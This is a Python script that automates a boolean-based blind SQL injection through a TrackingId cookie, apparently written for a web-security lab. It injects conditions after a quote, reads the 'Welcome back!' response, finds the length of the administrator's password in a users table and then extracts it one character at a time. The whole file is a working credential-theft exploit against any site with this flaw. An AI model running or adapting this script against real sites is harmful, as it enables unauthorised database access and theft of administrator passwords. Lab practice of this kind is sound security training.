import requests
import string

url = input("Enter the url(with any category): ")
tracking_id = input("Enter th tracking ID: ")
session_id = input("Enter the session ID: ")

def check(payload):
    Tracking_ID = tracking_id + "' AND " + payload + "--"
    # print(f"Cookie: {Tracking_ID}")
    cookies = {"TrackingId": Tracking_ID, "session": session_id}
    result = requests.get(url, cookies=cookies)
    return "Welcome back!" in result.text
    
def find_length():
    for i in range(1,51):
        payload = f"LENGTH((SELECT password from users WHERE username='administrator')) = {i}"
        result = check(payload)
        if result:
            return i
        
def find_password(length):
    password = ""
    chars = string.ascii_lowercase + string.digits

    for i in range(1,length + 1):
        for char in chars:
            payload = f"SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{char}'"
            if check(payload):
                password += char
                print(f"[+] Position {i}: {char} → {password}")
                break
    return password


if __name__ == "__main__":
    print("Finding length...")
    length = find_length()
    print(f"Password length: {length}")
    print("Finding password...")
    password = find_password(length)
    print(f"Password: {password}")